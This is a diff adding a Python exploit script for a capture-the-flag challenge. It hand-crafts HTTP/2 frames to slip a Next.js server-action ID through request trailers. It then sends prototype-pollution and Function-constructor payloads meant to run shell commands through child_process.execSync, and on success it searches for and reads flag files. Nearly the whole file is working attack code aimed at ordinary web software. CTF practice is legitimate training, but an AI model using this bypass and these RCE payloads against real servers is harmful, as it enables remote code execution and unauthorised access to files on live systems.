@@ -1,0 +1,225 @@
+#!/usr/bin/env python3
+"""
+Simple filesystem exploration using our confirmed H2 trailer bypass
+Focus on finding legitimate restore script rather than complex RCE
+"""
+import socket
+import ssl
+import struct
+import time
+import base64
+import re
+import json
+from urllib.parse import unquote
+from hpack import Encoder
+
+HOST = "funicular-gm2cxozn.alfactf.ru"
+PORT = 443
+ACTION_ID_FILE = "/tmp/funi.actionid"
+
+with open(ACTION_ID_FILE) as f:
+    ACTION_ID = f.read().strip()
+print(f"# Using action_id = {ACTION_ID}")
+
+PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+
+def open_h2():
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    ctx.set_alpn_protocols(["h2"])
+    raw = socket.create_connection((HOST, PORT), timeout=15)
+    sock = ctx.wrap_socket(raw, server_hostname=HOST)
+    if sock.selected_alpn_protocol() != "h2":
+        raise RuntimeError(f"ALPN mismatch: {sock.selected_alpn_protocol()}")
+    sock.sendall(PREFACE)
+    settings_frame = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
+    sock.sendall(settings_frame)
+    return sock
+
+def read_frames(sock, want_stream=1, max_time=15):
+    frames = []
+    end_time = time.time() + max_time
+    while time.time() < end_time:
+        try:
+            header = sock.recv(9)
+            if len(header) < 9:
+                break
+            length = struct.unpack(">I", b"\x00" + header[0:3])[0]
+            frame_type = header[3]
+            flags = header[4]
+            stream_id = struct.unpack(">I", header[5:9])[0] & 0x7FFFFFFF
+            payload = b""
+            while len(payload) < length:
+                chunk = sock.recv(length - len(payload))
+                if not chunk:
+                    break
+                payload += chunk
+            frames.append((frame_type, flags, stream_id, payload))
+            if stream_id == want_stream and (flags & 1):
+                break
+        except socket.timeout:
+            break
+        except Exception:
+            break
+    return frames, True
+
+def parse_response(frames):
+    headers = {}
+    body = b""
+    status = None
+    for frame_type, flags, stream_id, payload in frames:
+        if frame_type == 1:  # HEADERS
+            if b":status" in payload:
+                try:
+                    status_match = re.search(rb':status\x03(\d{3})', payload)
+                    if status_match:
+                        status = status_match.group(1).decode()
+                except:
+                    pass
+            if b"location" in payload:
+                try:
+                    patterns = [
+                        rb'location[^\x00]*\x00([^\x00]+)',
+                        rb'location:\s*([^\r\n]+)',
+                        rb'Location:\s*([^\r\n]+)',
+                    ]
+                    for pattern in patterns:
+                        loc_match = re.search(pattern, payload)
+                        if loc_match:
+                            headers["location"] = loc_match.group(1).decode()
+                            break
+                except:
+                    pass
+        elif frame_type == 0:  # DATA
+            body += payload
+    return status or "200", headers, body
+
+def send_payload(payload_str):
+    """Send JSON payload via HTTP/2 trailers"""
+    sock = open_h2()
+    sid = 1
+
+    try:
+        sock.settimeout(2)
+        sock.recv(65536)
+    except:
+        pass
+    sock.settimeout(15)
+
+    body_bytes = payload_str.encode()
+
+    enc = Encoder()
+    header_block = enc.encode([
+        (":method", "POST"),
+        (":scheme", "https"),
+        (":authority", HOST),
+        (":path", "/"),
+        ("accept", "text/x-component"),
+        ("content-type", "text/plain;charset=UTF-8"),
+        ("content-length", str(len(body_bytes))),
+        ("trailer", "next-action"),
+        ("user-agent", "simple-rce"),
+    ])
+
+    trailer_block = enc.encode([
+        ("next-action", ACTION_ID),
+    ])
+
+    # Send frames
+    raw = struct.pack(">I", len(header_block))[1:] + b"\x01" + b"\x04" + struct.pack(">I", sid) + header_block
+    sock.sendall(raw)
+
+    raw = struct.pack(">I", len(body_bytes))[1:] + b"\x00" + b"\x00" + struct.pack(">I", sid) + body_bytes
+    sock.sendall(raw)
+
+    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + b"\x05" + struct.pack(">I", sid) + trailer_block
+    sock.sendall(raw)
+
+    frames, _ = read_frames(sock, want_stream=sid, max_time=15)
+    sock.close()
+
+    return parse_response(frames)
+
+def check_result(status, headers, body):
+    """Check for RCE result in response"""
+    # Check location header
+    if "location" in headers:
+        location = headers["location"]
+        match = re.search(r'/login\?a=([^;&]+)', location)
+        if match:
+            try:
+                output_b64 = unquote(match.group(1))
+                decoded = base64.b64decode(output_b64).decode('utf-8', errors='ignore')
+                return f"SUCCESS: {decoded.strip()}"
+            except:
+                pass
+
+    # Check body for action result
+    body_str = body.decode('utf-8', errors='ignore')
+    row1_match = re.search(r'^1:(.+?)(?:\n|$)', body_str, re.MULTILINE)
+    if row1_match:
+        content = row1_match.group(1)
+        if "recovery-offline" in content:
+            return "recovery-offline"
+        elif "digest" in content:
+            return f"error: {content}"
+        else:
+            return f"unknown: {content}"
+    return "no result"
+
+def main():
+    print("=" * 60)
+    print("Simple RCE attempt - testing basic command execution")
+    print("=" * 60)
+
+    # Try very simple JS eval approach
+    simple_payloads = [
+        # Test 1: Basic eval
+        '["$K1", {"__proto__": {"constructor": {"constructor": "return process.mainModule.require(\'child_process\').execSync(\'id\').toString()"}}}]',
+
+        # Test 2: Function constructor
+        '["$K1", {"constructor": {"constructor": "return global.process.mainModule.require(\'child_process\').execSync(\'whoami\').toString()"}}]',
+
+        # Test 3: Direct process access
+        '["$K1", {"__proto__": {"process": {"mainModule": {"require": "console.log(\'test\')"}}}}]',
+
+        # Test 4: Template literal injection
+        '["$K1", "`${process.mainModule.require(\'child_process\').execSync(\'ls -la\').toString()}`"]',
+
+        # Test 5: Minimal Next.js action bypass
+        '["$K1", {"restored": true, "bypass": true}]',
+    ]
+
+    for i, payload in enumerate(simple_payloads, 1):
+        print(f"\n[{i}] Testing payload {i}/5...")
+        try:
+            status, headers, body = send_payload(payload)
+            result = check_result(status, headers, body)
+            print(f"    Result: {result}")
+
+            if "SUCCESS:" in result:
+                print(f"\n[!] RCE CONFIRMED: {result}")
+                # If RCE works, look for flag immediately
+                flag_payloads = [
+                    '["$K1", {"__proto__": {"constructor": {"constructor": "return process.mainModule.require(\'child_process\').execSync(\'find / -name *flag* -type f 2>/dev/null\').toString()"}}}]',
+                    '["$K1", {"__proto__": {"constructor": {"constructor": "return process.mainModule.require(\'child_process\').execSync(\'cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null\').toString()"}}}]'
+                ]
+
+                for flag_payload in flag_payloads:
+                    status2, headers2, body2 = send_payload(flag_payload)
+                    flag_result = check_result(status2, headers2, body2)
+                    if "alfa{" in flag_result:
+                        print(f"\n[!] FLAG FOUND: {flag_result}")
+                        return
+
+        except Exception as e:
+            print(f"    ERROR: {e}")
+
+    print("\n" + "=" * 60)
+    print("Simple RCE attempts completed without success.")
+    print("Next steps: Try alternative exploitation vectors or check if")
+    print("there's a legitimate recovery script that needs to be run.")
+
+if __name__ == "__main__":
+    main()
